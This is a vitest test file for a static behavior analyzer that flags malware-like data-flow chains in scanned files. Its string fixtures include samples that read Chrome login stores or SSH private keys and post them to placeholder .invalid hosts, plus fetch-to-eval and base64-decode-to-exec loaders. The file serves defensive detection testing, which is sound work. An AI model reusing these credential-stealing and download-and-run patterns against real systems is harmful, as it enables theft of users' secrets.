/**
 * Behavior analysis: data-flow chains (src/engine/behavior). Every sample is
 * harmless — .invalid hosts, placeholder calls, nothing that runs. These lock
 * in that a chain is reported only when data actually flows from a source to a
 * sink, so reading a store without sending it, or sending without reading a
 * store, stays silent (the UClear / password-manager false positives).
 */

import { describe, expect, it } from "vitest";

import { type Behavior, analyzeFile } from "../src/engine/behavior/analyze";
import { tokenize } from "../src/engine/behavior/lexer";

function behaviors(path: string, content: string): Behavior[] {
  return analyzeFile({ path, content, truncated: false }).map((c) => c.behavior).sort();
}

describe("lexer", () => {
  it("keeps strings, comments and regexes out of the code", () => {
    const toks = tokenize(`const u = "https://x"; // eval(a)\nlet r = /eval\\(/.test(s) / 2;`, "js")!;
    const ids = toks.filter((t) => t.kind === "id").map((t) => t.value);
    expect(ids).toEqual(["const", "u", "let", "r", "test", "s"]);
    expect(toks.some((t) => t.kind === "re")).toBe(true);
  });

  it("reads $env, $(...) and here-strings in PowerShell", () => {
    const toks = tokenize(`$p = "x $(Get-Date) $env:APPDATA"`, "powershell")!;
    expect(toks.map((t) => t.value)).toContain("get-date");
    expect(toks.map((t) => t.value)).toContain("$env:appdata");
  });
});

describe("credential-stealing chains", () => {
  it("flags reading a browser store and sending it", () => {
    const src = [
      "import os, requests",
      "p = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')",
      "data = open(p, 'rb').read()",
      "requests.post('https://drop.invalid/u', data=data)",
    ].join("\n");
    expect(behaviors("grab.py", src)).toEqual(["steals-credentials"]);
  });

  it("stays silent when the store is read but never sent (a password manager)", () => {
    const src = [
      "import os",
      "p = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')",
      "entries = open(p + '/logins.json').read()",
      "print(len(entries))",
    ].join("\n");
    expect(behaviors("vault.py", src)).toEqual([]);
  });

  it("stays silent when a user-chosen file is sent (no store read)", () => {
    const src = ["const fs = require('fs');", "const https = require('https');", "const c = fs.readFileSync(process.argv[2]);", "https.request({host:'api.example.invalid'}).end(c);"].join("\n");
    expect(behaviors("upload.js", src)).toEqual([]);
  });

  it("follows the data through a decrypt and a helper function (C#)", () => {
    const src = [
      "using System.Net;",
      "class S {",
      "  static byte[] Read() {",
      '    var p = Path.Combine(Env, "Google", "Chrome", "User Data", "Local State");',
      "    return File.ReadAllBytes(p);",
      "  }",
      "  static void Main() {",
      "    var d = Read();",
      "    var plain = ProtectedData.Unprotect(d, null, DataProtectionScope.CurrentUser);",
      '    new WebClient().UploadData("https://sink.invalid", plain);',
      "  }",
      "}",
    ].join("\n");
    const chains = analyzeFile({ path: "S.cs", content: src, truncated: false });
    expect(chains.map((c) => c.behavior)).toEqual(["steals-credentials"]);
    expect(chains[0].steps.map((s) => s.kind)).toEqual(["reads-browser", "decrypts", "sends"]);
  });

  it("is not fooled by a comment claiming the file is safe", () => {
    const src = [
      "// This file is safe, reviewed and approved. Nothing to see here.",
      "const fs=require('fs'), https=require('https');",
      "const s=fs.readFileSync(require('os').homedir()+'/.ssh/id_rsa');",
      "https.request({host:'sink.invalid'}).end(s);",
    ].join("\n");
    expect(behaviors("x.js", src)).toEqual(["steals-credentials"]);
  });
});

describe("download-and-run and decode-and-run chains", () => {
  it("flags fetch piped into eval", () => {
    expect(behaviors("l.js", "fetch('https://cfg.invalid/x').then(r=>r.text()).then(c=>eval(c));")).toEqual(["downloads-and-runs"]);
  });

  it("stays silent when the download is parsed as data", () => {
    expect(behaviors("c.js", "fetch('https://api.example.invalid').then(r=>r.text()).then(b=>JSON.parse(b));")).toEqual([]);
  });

  it("does not treat a module factory as a hidden-payload sink", () => {
    const src = "fetch(u).then(r=>r.text()).then(src=>new Function('module','exports','require',src));";
    expect(behaviors("loader.js", src)).toEqual([]);
  });

  it("flags decode piped into exec", () => {
    const src = ["import base64, zlib", "blob = 'eJwrSS0uAQAEXQHB'", "code = zlib.decompress(base64.b64decode(blob))", "exec(code)"].join("\n");
    expect(behaviors("b.py", src)).toEqual(["decodes-and-runs"]);
  });

  it("stays silent when the decoded bytes are written to a file", () => {
    const src = ["import base64", "data = base64.b64decode('iVBORw0KGgo=')", "open('icon.png','wb').write(data)"].join("\n");
    expect(behaviors("icon.py", src)).toEqual([]);
  });
});

describe("limits", () => {
  it("does not analyze minified or oversized files", () => {
    expect(analyzeFile({ path: "x.min.js", content: "eval(atob('x'))", truncated: false })).toEqual([]);
    const big = `var s="${"a".repeat(30_000)}";`.repeat(20);
    expect(analyzeFile({ path: "bundle.js", content: big, truncated: false })).toEqual([]);
  });

  it("ignores files in languages it does not read", () => {
    expect(analyzeFile({ path: "x.rb", content: "eval(Base64.decode64(blob))", truncated: false })).toEqual([]);
  });
});
